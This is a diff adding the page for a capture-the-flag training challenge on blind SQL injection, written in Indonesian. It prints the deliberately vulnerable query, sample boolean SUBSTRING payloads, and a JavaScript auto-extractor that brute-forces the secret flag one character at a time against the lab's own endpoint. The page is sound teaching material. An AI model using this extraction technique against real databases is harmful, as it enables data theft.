@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQLi #3 — Blind SQLi</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+  <nav class="navbar">
+    <div class="nav-brand"><span>🛡️</span> CTF Lab</div>
+    <div class="nav-links"><a href="/dashboard.html" class="nav-link">← Dashboard</a></div>
+    <div class="nav-user"><span class="user-badge" id="user-nim">...</span></div>
+  </nav>
+  <div class="main-content">
+    <div class="challenge-page">
+      <div class="challenge-header">
+        <div style="display:flex;gap:10px;align-items:center;margin-bottom:12px">
+          <span class="badge-diff diff-hard">Hard</span>
+          <span class="challenge-category cat-sqli">SQLi · Challenge #3</span>
+          <span class="badge-points">⚡ 300 pts</span>
+        </div>
+        <h1>Blind SQL Injection — Sabar & Teliti</h1>
+        <p class="challenge-desc-full">Tidak ada data yang ditampilkan langsung — server hanya menjawab "✅ Data Ditemukan" atau "❌ Data Tidak Ditemukan". Gunakan kondisi boolean untuk mengekstrak flag karakter per karakter!</p>
+        <details class="hint-box">
+          <summary>💡 Tampilkan Hint</summary>
+          <p>Query server: <code>SELECT secret_value FROM ctf_secrets WHERE secret_name='flag_sqli3' AND [INPUT]</code><br><br>
+          Untuk cek karakter pertama:<br>
+          <code>1=1 AND SUBSTRING(secret_value,1,1)='C'</code> → Ditemukan ✅<br>
+          <code>1=1 AND SUBSTRING(secret_value,1,1)='X'</code> → Tidak Ditemukan ❌<br><br>
+          Flag format: CTF{...} — karakter 1-4 pasti C,T,F,{</p>
+        </details>
+      </div>
+
+      <div class="tutorial-card mb-4" style="background:var(--bg2)">
+        <h3>🔎 Endpoint Blind SQLi</h3>
+        <p class="text-dim" style="margin-bottom:12px">Masukkan kondisi SQL (yang akan ditambahkan setelah WHERE clause):</p>
+        <div style="display:flex;gap:10px;margin-bottom:12px">
+          <input type="text" id="blind-input" class="flag-input" placeholder="Contoh: 1=1 atau 1=2 atau SUBSTRING(secret_value,1,1)='C'" style="flex:1">
+          <button class="btn-submit-flag" onclick="doBlindCheck()">Cek</button>
+        </div>
+        <div id="blind-result" style="padding:16px;background:var(--bg3);border-radius:var(--radius);text-align:center;font-size:1.1rem;font-weight:600;color:var(--text-dim)">
+          Masukkan kondisi dan klik "Cek"
+        </div>
+      </div>
+
+      <div class="tutorial-card mb-4" style="background:var(--bg2)">
+        <h3>🤖 Auto Extractor (Bonus Tool)</h3>
+        <p class="text-dim" style="margin-bottom:12px;font-size:0.875rem">Tool ini akan otomatis mengekstrak flag dengan mengirim banyak request. Klik untuk mulai:</p>
+        <button class="open-challenge-btn" onclick="autoExtract()" id="extract-btn">🚀 Mulai Auto Extract</button>
+        <div id="extract-log" style="margin-top:12px;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:12px;font-family:monospace;font-size:0.8rem;max-height:200px;overflow-y:auto;display:none"></div>
+        <div id="extracted-flag" style="margin-top:8px"></div>
+      </div>
+
+      <div class="tutorial-card mb-4" style="background:var(--bg2)">
+        <h3>📋 Query yang Digunakan</h3>
+        <div class="code-block">
+          <span class="comment">// Query server (rentan):</span><br>
+          SELECT secret_value FROM ctf_secrets<br>
+          WHERE secret_name='flag_sqli3'<br>
+          AND <span class="highlight">[INPUT_KAMU]</span><br><br>
+          <span class="comment">// Gunakan SUBSTRING untuk cek per karakter:</span><br>
+          SUBSTRING(secret_value, <span class="string">posisi</span>, 1) = '<span class="string">karakter</span>'
+        </div>
+      </div>
+
+      <div class="flag-submit-card">
+        <h3>🚩 Submit Flag</h3>
+        <div class="flag-input-wrap">
+          <input type="text" class="flag-input" id="flag-input" placeholder="CTF{...}">
+          <button class="btn-submit-flag" onclick="submitFlag()">Submit</button>
+        </div>
+        <div class="alert" id="flag-alert" style="margin-top:10px"></div>
+      </div>
+    </div>
+  </div>
+  <script>
+    async function init() {
+      const me = await fetch('/api/auth/me').then(r=>r.json()).catch(()=>null);
+      if (!me || me.role !== 'student') return location.href = '/';
+      document.getElementById('user-nim').textContent = me.user.nim;
+    }
+    async function doBlindCheck() {
+      const q = document.getElementById('blind-input').value;
+      const result = document.getElementById('blind-result');
+      const r = await fetch('/vuln/sqli-3/check?q=' + encodeURIComponent(q));
+      const d = await r.json();
+      result.textContent = d.message;
+      result.style.color = d.found ? 'var(--green)' : 'var(--red)';
+    }
+    async function autoExtract() {
+      const btn = document.getElementById('extract-btn');
+      const log = document.getElementById('extract-log');
+      const flagDiv = document.getElementById('extracted-flag');
+      btn.disabled = true; btn.textContent = '⏳ Extracting...';
+      log.style.display = 'block'; log.innerHTML = '';
+      const chars = 'CTF{abcdefghijklmnopqrstuvwxyz0123456789_}';
+      let flag = '';
+      for (let pos = 1; pos <= 30; pos++) {
+        let found = false;
+        for (const ch of chars) {
+          const payload = `1=1 AND SUBSTRING(secret_value,${pos},1)='${ch}'`;
+          const r = await fetch('/vuln/sqli-3/check?q=' + encodeURIComponent(payload));
+          const d = await r.json();
+          if (d.found) {
+            flag += ch;
+            log.innerHTML += `<span style="color:var(--green)">Pos ${pos}: '${ch}' ✓ → ${flag}</span>\n`;
+            log.scrollTop = log.scrollHeight;
+            found = true;
+            if (ch === '}') { pos = 999; } // done
+            break;
+          }
+        }
+        if (!found) break;
+      }
+      btn.disabled = false; btn.textContent = '✅ Selesai!';
+      flagDiv.innerHTML = `<div class="success-box">🚩 Flag ditemukan: <strong style="font-family:monospace">${flag}</strong></div>`;
+      document.getElementById('flag-input').value = flag;
+    }
+    async function submitFlag() {
+      const flag = document.getElementById('flag-input').value.trim();
+      const alertEl = document.getElementById('flag-alert');
+      if (!flag) return;
+      const r = await fetch('/api/challenges/submit', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({slug:'sqli-3',flag})});
+      const d = await r.json();
+      alertEl.className = 'alert show ' + (d.success ? 'alert-success' : 'alert-error');
+      alertEl.textContent = d.success ? `🎉 ${d.message}` : `❌ ${d.error}`;
+      if (d.success) setTimeout(()=>location.href='/dashboard.html', 2000);
+    }
+    init();
+  </script>
+</body>
+</html>
